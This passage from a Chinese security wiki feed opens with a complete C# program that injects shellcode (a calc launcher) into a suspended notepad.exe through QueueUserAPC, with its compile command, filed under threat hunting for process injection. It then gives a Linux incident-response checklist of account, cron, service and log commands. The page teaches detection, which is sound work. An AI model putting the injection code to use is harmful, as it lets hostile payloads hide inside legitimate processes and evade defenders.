class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">public class ApcInjectionNewProcess</span><br><span class="line">&#123;</span><br><span class="line">       public static void Main()</span><br><span class="line">       &#123;      </span><br><span class="line">              byte[] shellcode = new byte[112]&#123;0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3&#125;;</span><br><span class="line">              </span><br><span class="line">              // Target process to inject into</span><br><span class="line">              string processpath = @&quot;C:\Windows\notepad.exe&quot;;</span><br><span class="line">              STARTUPINFO si = new STARTUPINFO();</span><br><span class="line">              PROCESS_INFORMATION pi = new PROCESS_INFORMATION();</span><br><span class="line">              </span><br><span class="line">              // Create new process in suspended state to inject into</span><br><span class="line">              bool success = CreateProcess(processpath, null,</span><br><span class="line">                     IntPtr.Zero, IntPtr.Zero, false,</span><br><span class="line">                     ProcessCreationFlags.CREATE_SUSPENDED,</span><br><span class="line">                     IntPtr.Zero, null, ref si, out pi);</span><br><span class="line">              </span><br><span class="line">              // Allocate memory within process and write shellcode</span><br><span class="line">              IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">              IntPtr bytesWritten = IntPtr.Zero;</span><br><span class="line">              bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);</span><br><span class="line">              </span><br><span class="line">              // Open thread</span><br><span class="line">              IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);</span><br><span class="line">              uint oldProtect = 0;</span><br><span class="line">              </span><br><span class="line">              // Modify memory permissions on allocated shellcode</span><br><span class="line">              resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);</span><br><span class="line">              </span><br><span class="line">              // Assign address of shellcode to the target thread apc queue</span><br><span class="line">              IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);</span><br><span class="line">              </span><br><span class="line">              IntPtr ThreadHandle = pi.hThread;</span><br><span class="line">              ResumeThread(ThreadHandle);</span><br><span class="line">              </span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line"> </span><br><span class="line">       private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I&#x27;m not using this #DFIR</span><br><span class="line">       private static UInt32 PAGE_READWRITE = 0x04;</span><br><span class="line">       private static UInt32 PAGE_EXECUTE_READ = 0x20;</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       [Flags]</span><br><span class="line">       public enum ProcessAccessFlags : uint</span><br><span class="line">       &#123;</span><br><span class="line">              All = 0x001F0FFF,</span><br><span class="line">              Terminate = 0x00000001,</span><br><span class="line">              CreateThread = 0x00000002,</span><br><span class="line">              VirtualMemoryOperation = 0x00000008,</span><br><span class="line">              VirtualMemoryRead = 0x00000010,</span><br><span class="line">              VirtualMemoryWrite = 0x00000020,</span><br><span class="line">              DuplicateHandle = 0x00000040,</span><br><span class="line">              CreateProcess = 0x000000080,</span><br><span class="line">              SetQuota = 0x00000100,</span><br><span class="line">              SetInformation = 0x00000200,</span><br><span class="line">              QueryInformation = 0x00000400,</span><br><span class="line">              QueryLimitedInformation = 0x00001000,</span><br><span class="line">              Synchronize = 0x00100000</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       [Flags]</span><br><span class="line">       public enum ProcessCreationFlags : uint</span><br><span class="line">       &#123;</span><br><span class="line">              ZERO_FLAG = 0x00000000,</span><br><span class="line">              CREATE_BREAKAWAY_FROM_JOB = 0x01000000,</span><br><span class="line">              CREATE_DEFAULT_ERROR_MODE = 0x04000000,</span><br><span class="line">              CREATE_NEW_CONSOLE = 0x00000010,</span><br><span class="line">              CREATE_NEW_PROCESS_GROUP = 0x00000200,</span><br><span class="line">              CREATE_NO_WINDOW = 0x08000000,</span><br><span class="line">              CREATE_PROTECTED_PROCESS = 0x00040000,</span><br><span class="line">              CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,</span><br><span class="line">              CREATE_SEPARATE_WOW_VDM = 0x00001000,</span><br><span class="line">              CREATE_SHARED_WOW_VDM = 0x00001000,</span><br><span class="line">              CREATE_SUSPENDED = 0x00000004,</span><br><span class="line">              CREATE_UNICODE_ENVIRONMENT = 0x00000400,</span><br><span class="line">              DEBUG_ONLY_THIS_PROCESS = 0x00000002,</span><br><span class="line">              DEBUG_PROCESS = 0x00000001,</span><br><span class="line">              DETACHED_PROCESS = 0x00000008,</span><br><span class="line">              EXTENDED_STARTUPINFO_PRESENT = 0x00080000,</span><br><span class="line">              INHERIT_PARENT_AFFINITY = 0x00010000</span><br><span class="line">       &#125;</span><br><span class="line">       public struct PROCESS_INFORMATION</span><br><span class="line">       &#123;</span><br><span class="line">              public IntPtr hProcess;</span><br><span class="line">              public IntPtr hThread;</span><br><span class="line">              public uint dwProcessId;</span><br><span class="line">              public uint dwThreadId;</span><br><span class="line">       &#125;</span><br><span class="line">       public struct STARTUPINFO</span><br><span class="line">       &#123;</span><br><span class="line">              public uint cb;</span><br><span class="line">              public string lpReserved;</span><br><span class="line">              public string lpDesktop;</span><br><span class="line">              public string lpTitle;</span><br><span class="line">              public uint dwX;</span><br><span class="line">              public uint dwY;</span><br><span class="line">              public uint dwXSize;</span><br><span class="line">              public uint dwYSize;</span><br><span class="line">              public uint dwXCountChars;</span><br><span class="line">              public uint dwYCountChars;</span><br><span class="line">              public uint dwFillAttribute;</span><br><span class="line">              public uint dwFlags;</span><br><span class="line">              public short wShowWindow;</span><br><span class="line">              public short cbReserved2;</span><br><span class="line">              public IntPtr lpReserved2;</span><br><span class="line">              public IntPtr hStdInput;</span><br><span class="line">              public IntPtr hStdOutput;</span><br><span class="line">              public IntPtr hStdError;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       [Flags]</span><br><span class="line">       public enum    ThreadAccess : int</span><br><span class="line">       &#123;</span><br><span class="line">              TERMINATE           = (0x0001)  ,</span><br><span class="line">              SUSPEND_RESUME      = (0x0002)  ,</span><br><span class="line">              GET_CONTEXT         = (0x0008)  ,</span><br><span class="line">              SET_CONTEXT         = (0x0010)  ,</span><br><span class="line">              SET_INFORMATION     = (0x0020)  ,</span><br><span class="line">              QUERY_INFORMATION       = (0x0040)  ,</span><br><span class="line">              SET_THREAD_TOKEN    = (0x0080)  ,</span><br><span class="line">              IMPERSONATE         = (0x0100)  ,</span><br><span class="line">              DIRECT_IMPERSONATION    = (0x0200)</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">       public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,</span><br><span class="line">              int dwThreadId);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;,SetLastError = true)]</span><br><span class="line">       public static extern bool WriteProcessMemory(</span><br><span class="line">              IntPtr hProcess,</span><br><span class="line">              IntPtr lpBaseAddress,</span><br><span class="line">              byte[] lpBuffer,</span><br><span class="line">              int nSize,</span><br><span class="line">              out IntPtr lpNumberOfBytesWritten);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">       public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">               Int32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;, SetLastError = true )]</span><br><span class="line">       public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,</span><br><span class="line">       Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">       public static extern IntPtr OpenProcess(</span><br><span class="line">        ProcessAccessFlags processAccess,</span><br><span class="line">        bool bInheritHandle,</span><br><span class="line">        int processId</span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern uint ResumeThread(IntPtr hThread);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern uint SuspendThread(IntPtr hThread);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,</span><br><span class="line">       int dwSize, uint flNewProtect, out uint lpflOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用csc.exe直接编译为exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:&quot;System.Runtime.dll&quot; /target:exe APCInject.cs</span><br></pre></td></tr></table></figure><p>执行APCinject.exe，执行notepad.exe，弹出计算器calc.exe</p><p><img src="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/2.png"></p><h2 id="Threat-Hunting"><a href="#Threat-Hunting" class="headerlink" title="Threat Hunting"></a>Threat Hunting</h2><h3 id="Process-and-Memory-Analysis"><a href="#Process-and-Memory-Analysis" class="headerlink" title="Process and Memory Analysis"></a>Process and Memory Analysis</h3><h3 id="Log-Analysis"><a href="#Log-Analysis" class="headerlink" title="Log Analysis"></a>Log Analysis</h3><h3 id="Network-Traffic-Analysis"><a href="#Network-Traffic-Analysis" class="headerlink" title="Network Traffic Analysis"></a>Network Traffic Analysis</h3><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><blockquote><ul><li><a href></a></li><li><a href></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Metadata&quot;&gt;&lt;a href=&quot;#Metadata&quot; class=&quot;headerlink&quot; title=&quot;Metadata&quot;&gt;&lt;/a&gt;Metadata&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;th&gt;Tahir&lt;/t</summary>
      
    
    
    
    <category term="5. 高级威胁猎捕" scheme="http://example.com/categories/5-%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"/>
    
    <category term="Defense Evasion" scheme="http://example.com/categories/5-%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense-Evasion/"/>
    
    <category term="进程注入" scheme="http://example.com/categories/5-%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense-Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="Defense Evasion" scheme="http://example.com/tags/Defense-Evasion/"/>
    
  </entry>
  
  <entry>
    <title>Linux应急响应</title>
    <link href="http://example.com/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>http://example.com/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2021-07-23T03:10:21.000Z</published>
    <updated>2021-07-23T06:29:37.335Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Linux服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h4><p><strong>基本使用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel user       删除user用户</span><br><span class="line">userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><p><strong>基本使用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">通过.bash_history查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line"></span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h4 id="检查异常端口"><a href="#检查异常端口" class="headerlink" title="检查异常端口"></a>检查异常端口</h4><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure><h4 id="检查异常进程"><a href="#检查异常进程" class="headerlink" title="检查异常进程"></a>检查异常进程</h4><p>使用ps命令，分析进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid </span><br></pre></td></tr></table></figure><h4 id="检查开机启动项"><a href="#检查开机启动项" class="headerlink" title="检查开机启动项"></a>检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令<br>    runlevel   </p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：<br>    more /etc/rc.local<br>    /etc/rc.d/rc[0~6].d<br>    ls -l /etc/rc.d/rc3.d/</p><h4 id="检查定时任务"><a href="#检查定时任务" class="headerlink" title="检查定时任务"></a>检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用crontab创建计划任务</p><ul><li>基本命令</li></ul><p>crontab -l   列出某个用户cron服务的详细内容</p><p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p><p>crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</p><p>crontab -e   使用编辑器编辑当前的crontab文件 </p><p>如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p><p>2、利用anacron实现异步定时任务调度</p><ul><li>使用案例</li></ul><p>每天运行 /home/backup.sh脚本：<br>    vi /etc/anacrontab<br>    @daily    10    example.daily   /bin/bash /home/backup.sh</p><p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code> more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="检查服务"><a href="#检查服务" class="headerlink" title="检查服务"></a>检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改/etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep &quot;3:启用\|5:启用&quot;英文环境chkconfig --list | grep &quot;3:on\|5:on&quot;</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h4 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a>检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f  找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用stat进行创建修改时间。</p><h4 id="检查系统日志"><a href="#检查系统日志" class="headerlink" title="检查系统日志"></a>检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o 